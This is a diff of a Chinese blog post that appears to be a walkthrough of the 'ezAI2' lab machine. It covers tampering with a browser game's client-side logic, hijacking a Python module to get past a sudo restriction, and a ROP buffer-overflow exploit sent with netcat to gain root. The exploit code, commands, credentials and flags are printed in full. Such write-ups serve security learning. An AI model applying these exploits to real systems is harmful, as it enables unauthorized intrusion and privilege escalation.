@@ -18,7 +18,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_ezAI2.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_ezAI2</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -42,17 +42,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -86,144 +76,161 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
 <p>我先在当前网段扫了一遍主机。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo arp-scan -l</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
+<pre lang="bash"><code>sudo arp-scan -l
+</code></pre>
+<pre lang="text"><code>Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
 192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
 192.168.205.138 08:00:27:08:30:1a       PCS Systemtechnik GmbH
 192.168.205.254 00:50:56:f3:97:56       VMware, Inc.
 </code></pre>
-<p>这里可疑目标是 <code class="notranslate">192.168.205.138</code>，看网卡厂商也像靶机虚拟网卡。接着全端口扫一下确认攻击面。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nmap -p 0-65535 192.168.205.138</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">PORT     STATE SERVICE
+<p>这里可疑目标是 <code>192.168.205.138</code>，看网卡厂商也像靶机虚拟网卡。接着全端口扫一下确认攻击面。</p>
+<pre lang="bash"><code>nmap -p 0-65535 192.168.205.138
+</code></pre>
+<pre lang="text"><code>PORT     STATE SERVICE
 22/tcp   open  ssh
 8080/tcp open  http-proxy
 </code></pre>
-<p>只开了 <code class="notranslate">22</code> 和 <code class="notranslate">8080</code>，所以顺序很自然：先看 8080 的 Web 逻辑，能不能打出凭据再进 SSH。</p>
+<p>只开了 <code>22</code> 和 <code>8080</code>，所以顺序很自然：先看 8080 的 Web 逻辑，能不能打出凭据再进 SSH。</p>
 <h1>Web 入口与前端逻辑篡改</h1>
 <p>8080 是个井字棋页面。看源码时我马上留意到这段：</p>
-<div class="highlight highlight-text-html-basic"><pre class="notranslate"><span class="pl-kos">&lt;</span><span class="pl-ent">script</span> <span class="pl-c1">src</span>="<span class="pl-s">wasm_exec.js</span>"<span class="pl-kos">&gt;</span><span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre></div>
+<pre lang="html"><code>&lt;script src=&quot;wasm_exec.js&quot;&gt;&lt;/script&gt;
+</code></pre>
 <p>以及游戏关键逻辑：</p>
-<div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-c">// AI Move</span>
-<span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'status'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">innerText</span> <span class="pl-c1">=</span> <span class="pl-s">"AI THINKING..."</span><span class="pl-kos">;</span>
-<span class="pl-en">setTimeout</span><span class="pl-kos">(</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-c1">=&gt;</span> <span class="pl-kos">{</span>
-    <span class="pl-k">const</span> <span class="pl-s1">aiMove</span> <span class="pl-c1">=</span> <span class="pl-en">getAIMove</span><span class="pl-kos">(</span><span class="pl-s1">board</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-    <span class="pl-s1">board</span><span class="pl-kos">[</span><span class="pl-s1">aiMove</span><span class="pl-kos">]</span> <span class="pl-c1">=</span> <span class="pl-c1">2</span><span class="pl-kos">;</span>
-    <span class="pl-s1">moves</span><span class="pl-kos">.</span><span class="pl-en">push</span><span class="pl-kos">(</span><span class="pl-s1">aiMove</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-    <span class="pl-en">updateProof</span><span class="pl-kos">(</span><span class="pl-s1">aiMove</span><span class="pl-kos">,</span> <span class="pl-s1">moves</span><span class="pl-kos">.</span><span class="pl-c1">length</span> <span class="pl-c1">-</span> <span class="pl-c1">1</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-    <span class="pl-en">updateUI</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+<pre lang="javascript"><code>// AI Move
+document.getElementById('status').innerText = &quot;AI THINKING...&quot;;
+setTimeout(() =&gt; {
+    const aiMove = getAIMove(board);
+    board[aiMove] = 2;
+    moves.push(aiMove);
+    updateProof(aiMove, moves.length - 1);
+    updateUI();
 
-    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-en">checkWin</span><span class="pl-kos">(</span><span class="pl-c1">2</span><span class="pl-kos">)</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
-        <span class="pl-s1">gameOver</span> <span class="pl-c1">=</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>
-        <span class="pl-en">showModal</span><span class="pl-kos">(</span><span class="pl-s">'💥 AI WINS'</span><span class="pl-kos">,</span> <span class="pl-s">'AI 击败了你！\n想再试一次吗?'</span><span class="pl-kos">,</span> <span class="pl-s">'win'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'modal-button'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">onclick</span> <span class="pl-c1">=</span> <span class="pl-s1">resetGame</span><span class="pl-kos">;</span>
-    <span class="pl-kos">}</span> <span class="pl-k">else</span> <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">board</span><span class="pl-kos">.</span><span class="pl-en">every</span><span class="pl-kos">(</span><span class="pl-s1">c</span> <span class="pl-c1">=&gt;</span> <span class="pl-s1">c</span> <span class="pl-c1">!==</span> <span class="pl-c1">0</span><span class="pl-kos">)</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
-        <span class="pl-s1">gameOver</span> <span class="pl-c1">=</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>
-        <span class="pl-en">showModal</span><span class="pl-kos">(</span><span class="pl-s">'🤝 DRAW'</span><span class="pl-kos">,</span> <span class="pl-s">'平手了！再来一局?'</span><span class="pl-kos">,</span> <span class="pl-s">'draw'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'modal-button'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">onclick</span> <span class="pl-c1">=</span> <span class="pl-s1">resetGame</span><span class="pl-kos">;</span>
-    <span class="pl-kos">}</span> <span class="pl-k">else</span> <span class="pl-kos">{</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'status'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">innerText</span> <span class="pl-c1">=</span> <span class="pl-s">"YOUR TURN (X)"</span><span class="pl-kos">;</span>
-        <span class="pl-c">// Unlock player turn</span>
-        <span class="pl-s1">isPlayerTurn</span> <span class="pl-c1">=</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>
-    <span class="pl-kos">}</span>
-<span class="pl-kos">}</span><span class="pl-kos">,</span> <span class="pl-c1">50</span><span class="pl-kos">)</span><span class="pl-kos">;</span></pre></div>
-<div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-k">async</span> <span class="pl-k">function</span> <span class="pl-en">handleWin</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
-    <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'status'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">innerText</span> <span class="pl-c1">=</span> <span class="pl-s">"IMPOSSIBLE! VERIFYING..."</span><span class="pl-kos">;</span>
-    <span class="pl-s1">gameOver</span> <span class="pl-c1">=</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>
+    if (checkWin(2)) {
+        gameOver = true;
+        showModal('💥 AI WINS', 'AI 击败了你！\n想再试一次吗?', 'win');
+        document.getElementById('modal-button').onclick = resetGame;
+    } else if (board.every(c =&gt; c !== 0)) {
+        gameOver = true;
+        showModal('🤝 DRAW', '平手了！再来一局?', 'draw');
+        document.getElementById('modal-button').onclick = resetGame;
+    } else {
+        document.getElementById('status').innerText = &quot;YOUR TURN (X)&quot;;
+        // Unlock player turn
+        isPlayerTurn = true;
+    }
+}, 50);
+</code></pre>
+<pre lang="javascript"><code>async function handleWin() {
+    document.getElementById('status').innerText = &quot;IMPOSSIBLE! VERIFYING...&quot;;
+    gameOver = true;
   
-    <span class="pl-k">const</span> <span class="pl-s1">proof</span> <span class="pl-c1">=</span> <span class="pl-en">getCurrentProof</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-    <span class="pl-k">const</span> <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-k">await</span> <span class="pl-en">fetch</span><span class="pl-kos">(</span><span class="pl-s">"/win"</span><span class="pl-kos">,</span> <span class="pl-kos">{</span>
-        <span class="pl-c1">method</span>: <span class="pl-s">"POST"</span><span class="pl-kos">,</span>
-        <span class="pl-c1">headers</span>: <span class="pl-kos">{</span> <span class="pl-s">"Content-Type"</span>: <span class="pl-s">"application/json"</span> <span class="pl-kos">}</span><span class="pl-kos">,</span>
-        <span class="pl-c1">body</span>: <span class="pl-c1">JSON</span><span class="pl-kos">.</span><span class="pl-en">stringify</span><span class="pl-kos">(</span><span class="pl-kos">{</span>
-            <span class="pl-c1">session_id</span>: <span class="pl-s1">sessionID</span><span class="pl-kos">,</span>
-            <span class="pl-c1">moves</span>: <span class="pl-s1">moves</span><span class="pl-kos">,</span>
-            <span class="pl-c1">proof</span>: <span class="pl-s1">proof</span>
-        <span class="pl-kos">}</span><span class="pl-kos">)</span>
-    <span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+    const proof = getCurrentProof();
+    const resp = await fetch(&quot;/win&quot;, {
+        method: &quot;POST&quot;,
+        headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
+        body: JSON.stringify({
+            session_id: sessionID,
+            moves: moves,
+            proof: proof
+        })
+    });
 
-    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">resp</span><span class="pl-kos">.</span><span class="pl-c1">ok</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
-        <span class="pl-k">const</span> <span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-k">await</span> <span class="pl-s1">resp</span><span class="pl-kos">.</span><span class="pl-en">json</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'flag-display'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">classList</span><span class="pl-kos">.</span><span class="pl-en">remove</span><span class="pl-kos">(</span><span class="pl-s">'hidden'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'flag-text'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">innerText</span> <span class="pl-c1">=</span> <span class="pl-s1">data</span><span class="pl-kos">.</span><span class="pl-c1">flag</span><span class="pl-kos">;</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'status'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">innerText</span> <span class="pl-c1">=</span> <span class="pl-s">"SYSTEM COMPROMISED."</span><span class="pl-kos">;</span>
+    if (resp.ok) {
+        const data = await resp.json();
+        document.getElementById('flag-display').classList.remove('hidden');
+        document.getElementById('flag-text').innerText = data.flag;
+        document.getElementById('status').innerText = &quot;SYSTEM COMPROMISED.&quot;;
       
-        <span class="pl-en">showModal</span><span class="pl-kos">(</span><span class="pl-s">'🎉 SUCCESS!'</span><span class="pl-kos">,</span> <span class="pl-s">'你赢了，这是一组有效的凭据'</span><span class="pl-kos">,</span> <span class="pl-s">'win'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'modal-button'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">textContent</span> <span class="pl-c1">=</span> <span class="pl-s">'关闭'</span><span class="pl-kos">;</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'modal-button'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-en">onclick</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-c1">=&gt;</span> <span class="pl-en">hideModal</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
-    <span class="pl-kos">}</span> <span class="pl-k">else</span> <span class="pl-kos">{</span>
-        <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'status'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">innerText</span> <span class="pl-c1">=</span> <span class="pl-s">"VERIFICATION FAILED."</span><span class="pl-kos">;</span>
-    <span class="pl-kos">}</span>
-<span class="pl-kos">}</span></pre></div>
+        showModal('🎉 SUCCESS!', '你赢了，这是一组有效的凭据', 'win');
+        document.getElementById('modal-button').textContent = '关闭';
+        document.getElementById('modal-button').onclick = () =&gt; hideModal();
+    } else {
+        document.getElementById('status').innerText = &quot;VERIFICATION FAILED.&quot;;
+    }
+}
+</code></pre>
 <p>这段逻辑给我的判断很明确：</p>
 <ul>
 <li>AI 是 minimax，不会正常输；</li>
 <li>每步会更新 proof，服务端会验证；</li>
-<li>但 <code class="notranslate">getAIMove</code> 在全局作用域，可被前端 JS 直接覆盖。</li>
+<li>但 <code>getAIMove</code> 在全局作用域，可被前端 JS 直接覆盖。</li>
 </ul>
 <p>我在浏览器 F12 控制台里，刷新后立即打了这个覆盖：</p>
-<div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-en">getAIMove</span> <span class="pl-c1">=</span> <span class="pl-k">function</span><span class="pl-kos">(</span><span class="pl-s1">b</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
-    <span class="pl-k">for</span> <span class="pl-kos">(</span><span class="pl-k">let</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">8</span><span class="pl-kos">;</span> <span class="pl-s1">i</span> <span class="pl-c1">&gt;=</span> <span class="pl-c1">0</span><span class="pl-kos">;</span> <span class="pl-s1">i</span><span class="pl-c1">--</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
-        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">b</span><span class="pl-kos">[</span><span class="pl-s1">i</span><span class="pl-kos">]</span> <span class="pl-c1">===</span> <span class="pl-c1">0</span><span class="pl-kos">)</span> <span class="pl-k">return</span> <span class="pl-s1">i</span><span class="pl-kos">;</span>
-    <span class="pl-kos">}</span>
-    <span class="pl-k">return</span> <span class="pl-c1">0</span><span class="pl-kos">;</span>
-<span class="pl-kos">}</span><span class="pl-kos">;</span></pre></div>
+<pre lang="javascript"><code>getAIMove = function(b) {
+    for (let i = 8; i &gt;= 0; i--) {
+        if (b[i] === 0) return i;
+    }
+    return 0;
+};
+</code></pre>
 <p>这一步的目的就是把“不可战胜 AI”降级成“固定选最后空位”的弱 AI。因为我没有篡改 proof 流程，服务器验证也能过，最终页面给出一组 SSH 凭据：</p>
-<pre lang="text" class="notranslate"><code class="notranslate">ttt:1q2w3e4r@Dashazi
+<pre lang="text"><code>ttt:1q2w3e4r@Dashazi
 </code></pre>
 <h1>SSH 落地与 sudo 面分析</h1>
 <p>拿到凭据后直接登录。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ssh ttt@192.168.205.138</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">ttt@ezAI2:~$ id
+<pre lang="bash"><code>ssh ttt@192.168.205.138
+</code></pre>
+<pre lang="text"><code>ttt@ezAI2:~$ id
 uid=1000(ttt) gid=1000(ttt) groups=1000(ttt)
 </code></pre>
 <p>先看 sudo 权限：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -l</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">User ttt may run the following commands on ezAI2:
+<pre lang="bash"><code>sudo -l
+</code></pre>
+<pre lang="text"><code>User ttt may run the following commands on ezAI2:
     (yolo) NOPASSWD: /usr/bin/python3 /opt/greeting.py
 </code></pre>
-<p>这条 sudo 很关键：能以 <code class="notranslate">yolo</code> 身份跑指定 Python 脚本。接着看脚本内容和目录权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">cat /opt/greeting.py</pre></div>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">datetime</span>
-<span class="pl-k">import</span> <span class="pl-s1">random</span>
+<p>这条 sudo 很关键：能以 <code>yolo</code> 身份跑指定 Python 脚本。接着看脚本内容和目录权限。</p>
+<pre lang="bash"><code>cat /opt/greeting.py
+</code></pre>
+<pre lang="python"><code>import datetime
+import random
 ...
-<span class="pl-k">if</span> <span class="pl-s1">__name__</span> <span class="pl-c1">==</span> <span class="pl-s">"__main__"</span>:
-    <span class="pl-en">main</span>()</pre></div>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ls -la /opt/</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">drwxrwxrwt  3 root     root     4096 Feb 26 02:08 .
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<pre lang="bash"><code>ls -la /opt/
+</code></pre>
+<pre lang="text"><code>drwxrwxrwt  3 root     root     4096 Feb 26 02:08 .
 ...
 -rw-r--r--  1 yolo     yolo     2837 Feb 26 01:57 greeting.py
 </code></pre>
-<p><code class="notranslate">/opt</code> 是可写，而脚本里有 <code class="notranslate">import datetime</code>。我直接走模块劫持，把同名模块丢到 <code class="notranslate">/opt</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">cat <span class="pl-k">&gt;</span> /opt/datetime.py <span class="pl-s"><span class="pl-k">&lt;&lt;</span> '<span class="pl-k">EOF</span>'</span>
-<span class="pl-s">import os</span>
-<span class="pl-s">os.system("/bin/bash")</span>
-<span class="pl-s"><span class="pl-k">EOF</span></span></pre></div>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -u yolo /usr/bin/python3 /opt/greeting.py</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">yolo@ezAI2:/home/ttt$ id
+<p><code>/opt</code> 是可写，而脚本里有 <code>import datetime</code>。我直接走模块劫持，把同名模块丢到 <code>/opt</code>。</p>
+<pre lang="bash"><code>cat &gt; /opt/datetime.py &lt;&lt; 'EOF'
+import os
+os.system(&quot;/bin/bash&quot;)
+EOF
+</code></pre>
+<pre lang="bash"><code>sudo -u yolo /usr/bin/python3 /opt/greeting.py
+</code></pre>
+<pre lang="text"><code>yolo@ezAI2:/home/ttt$ id
 uid=1001(yolo) gid=1001(yolo) groups=1001(yolo)
 </code></pre>
-<p>这里拿到 <code class="notranslate">yolo</code> shell，说明导入链被成功劫持，sudo 限制等于被绕开了。</p>
+<p>这里拿到 <code>yolo</code> shell，说明导入链被成功劫持，sudo 限制等于被绕开了。</p>
 <h1>yolo 到 root：本地服务与二进制分析</h1>
-<p>拿到 <code class="notranslate">yolo</code> 后先看监听面：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ss -tlnp</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">LISTEN 0 20 127.0.0.1:9999 0.0.0.0:*
+<p>拿到 <code>yolo</code> 后先看监听面：</p>
+<pre lang="bash"><code>ss -tlnp
+</code></pre>
+<pre lang="text"><code>LISTEN 0 20 127.0.0.1:9999 0.0.0.0:*
 LISTEN 0 128 0.0.0.0:22    0.0.0.0:*
 LISTEN 0 128 *:8080        *:*
 </code></pre>
-<p><code class="notranslate">127.0.0.1:9999</code> 很像本地提权点。看家目录发现一个可执行文件：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ls -la /home/yolo</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">-rwxr-x--- 1 root yolo 17584 Feb 26 02:19 waityou
+<p><code>127.0.0.1:9999</code> 很像本地提权点。看家目录发现一个可执行文件：</p>
+<pre lang="bash"><code>ls -la /home/yolo
+</code></pre>
+<pre lang="text"><code>-rwxr-x--- 1 root yolo 17584 Feb 26 02:19 waityou
 </code></pre>
 <p>再确认进程归属：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ps aux<span class="pl-k">|</span>grep waityou</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">root         379  0.0  0.0   2228   560 ?        Ss   22:57   0:00 /home/yolo/waityou
+<pre lang="bash"><code>ps aux|grep waityou
+</code></pre>
+<pre lang="text"><code>root         379  0.0  0.0   2228   560 ?        Ss   22:57   0:00 /home/yolo/waityou
 </code></pre>
 <p>root 在跑它，且 yolo 组可执行，这就很典型了。</p>
 <h2>快速静态信息</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">strings /home/yolo/waityou</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">&gt;&gt;&gt; Enter Access Code:
+<pre lang="bash"><code>strings /home/yolo/waityou
+</code></pre>
+<pre lang="text"><code>&gt;&gt;&gt; Enter Access Code:
 ...
 gadget_shop
 vuln
@@ -231,54 +238,59 @@ system
 127.0.0.1
 ...
 </code></pre>
-<p><code class="notranslate">gadget_shop</code>、<code class="notranslate">vuln</code>、<code class="notranslate">system</code> 这些符号名非常友好，基本是在暗示 ROP。<br>
-我在 IDA 看了 <code class="notranslate">vuln</code> 伪代码，核心是：</p>
-<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-smi">ssize_t</span> <span class="pl-en">vuln</span>(<span class="pl-smi">int</span> <span class="pl-s1">a1</span>) {
-    <span class="pl-smi">char</span> <span class="pl-s1">buf</span>[<span class="pl-c1">64</span>];
-    <span class="pl-c">// ...</span>
-    <span class="pl-k">return</span> <span class="pl-en">read</span>(<span class="pl-c1">0</span>, <span class="pl-s1">buf</span>, <span class="pl-c1">0x100</span>); 
-}</pre></div>
+<p><code>gadget_shop</code>、<code>vuln</code>、<code>system</code> 这些符号名非常友好，基本是在暗示 ROP。
+我在 IDA 看了 <code>vuln</code> 伪代码，核心是：</p>
+<pre lang="c"><code>ssize_t vuln(int a1) {
+    char buf[64];
+    // ...
+    return read(0, buf, 0x100); 
+}
+</code></pre>
 <p>64 字节栈缓冲区读入 0x100，标准栈溢出。</p>
 <h2>定位 gadget、system 和 /bin/sh 参数</h2>
 <p>我在机器上直接用 objdump 把关键地址抠出来。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">objdump -d waityou <span class="pl-k">|</span> grep -A5 <span class="pl-s"><span class="pl-pds">"</span>gadget_shop<span class="pl-pds">"</span></span></pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">0000000000401242 &lt;gadget_shop&gt;:
+<pre lang="bash"><code>objdump -d waityou | grep -A5 &quot;gadget_shop&quot;
+</code></pre>
+<pre lang="text"><code>0000000000401242 &lt;gadget_shop&gt;:
   401242:       55                      push   %rbp
   401243:       48 89 e5                mov    %rsp,%rbp
   401246:       5f                      pop    %rdi
   401247:       c3                      retq
 </code></pre>
-<p>可直接用 <code class="notranslate">0x401246</code> 作为 <code class="notranslate">pop rdi; ret</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">objdump -t waityou <span class="pl-k">|</span> grep system</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">0000000000401050       F *UND*  0000000000000000              system@GLIBC_2.2.5
+<p>可直接用 <code>0x401246</code> 作为 <code>pop rdi; ret</code>。</p>
+<pre lang="bash"><code>objdump -t waityou | grep system
+</code></pre>
+<pre lang="text"><code>0000000000401050       F *UND*  0000000000000000              system@GLIBC_2.2.5
 0000000000404108 g     O .data  0000000000000008              __keep_system_plt
 </code></pre>
-<p><code class="notranslate">system@plt</code> 可用，地址 <code class="notranslate">0x401050</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">objdump -s -j .data waityou</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">4040e0 7368006d 61792062 65207368 65206973  sh.may be she is
+<p><code>system@plt</code> 可用，地址 <code>0x401050</code>。</p>
+<pre lang="bash"><code>objdump -s -j .data waityou
 </code></pre>
-<p><code class="notranslate">.data</code> 里开头就是 <code class="notranslate">sh\x00</code>，地址 <code class="notranslate">0x4040e0</code>，正好当参数。</p>
-<p>偏移量按栈布局算 <code class="notranslate">64 + 8 = 72</code>，构造 ROP 链就是：</p>
+<pre lang="text"><code>4040e0 7368006d 61792062 65207368 65206973  sh.may be she is
+</code></pre>
+<p><code>.data</code> 里开头就是 <code>sh\x00</code>，地址 <code>0x4040e0</code>，正好当参数。</p>
+<p>偏移量按栈布局算 <code>64 + 8 = 72</code>，构造 ROP 链就是：</p>
 <ul>
 <li>padding 72</li>
-<li><code class="notranslate">pop rdi ; ret</code></li>
-<li><code class="notranslate">0x4040e0</code>（"sh"）</li>
-<li><code class="notranslate">system@plt</code></li>
+<li><code>pop rdi ; ret</code></li>
+<li><code>0x4040e0</code>（&quot;sh&quot;）</li>
+<li><code>system@plt</code></li>
 </ul>
 <h1>打本地 9999 触发 root shell</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">(python3 -c <span class="pl-s"><span class="pl-pds">"</span></span>
-<span class="pl-s">import struct</span>
-<span class="pl-s">pop_rdi = 0x401246  </span>
-<span class="pl-s">sh_addr = 0x4040e0  </span>
-<span class="pl-s">system_plt = 0x401050 </span>
-<span class="pl-s">payload = b'A' * 72             </span>
-<span class="pl-s">payload += struct.pack('&lt;Q', pop_rdi) </span>
-<span class="pl-s">payload += struct.pack('&lt;Q', sh_addr) </span>
-<span class="pl-s">payload += struct.pack('&lt;Q', system_plt) </span>
-<span class="pl-s">import sys</span>
-<span class="pl-s">sys.stdout.buffer.write(payload)</span>
-<span class="pl-s"><span class="pl-pds">"</span></span><span class="pl-k">;</span> cat) <span class="pl-k">|</span>busybox nc 127.0.0.1 9999</pre></div>
-<pre lang="text" class="notranslate"><code class="notranslate">&gt;&gt;&gt; Initializing romantic link...
+<pre lang="bash"><code>(python3 -c &quot;
+import struct
+pop_rdi = 0x401246  
+sh_addr = 0x4040e0  
+system_plt = 0x401050 
+payload = b'A' * 72             
+payload += struct.pack('&lt;Q', pop_rdi) 
+payload += struct.pack('&lt;Q', sh_addr) 
+payload += struct.pack('&lt;Q', system_plt) 
+import sys
+sys.stdout.buffer.write(payload)
+&quot;; cat) |busybox nc 127.0.0.1 9999
+</code></pre>
+<pre lang="text"><code>&gt;&gt;&gt; Initializing romantic link...
 &gt;&gt;&gt; [LOG] 「私、幸せになる勇気がなかったの。」
 &gt;&gt;&gt; Enter Access Code: id
 uid=0(root) gid=0(root) groups=0(root)
@@ -286,7 +298,8 @@ cat /root/root.txt
 flag{4c00347e1f124840bc0a081aa77d9094}  
 cat /home/ttt/user.txt
 flag{7f0a4a443fbb441792197c6d9f1f52dd}
-</code></pre></div>
+</code></pre>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -311,7 +324,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
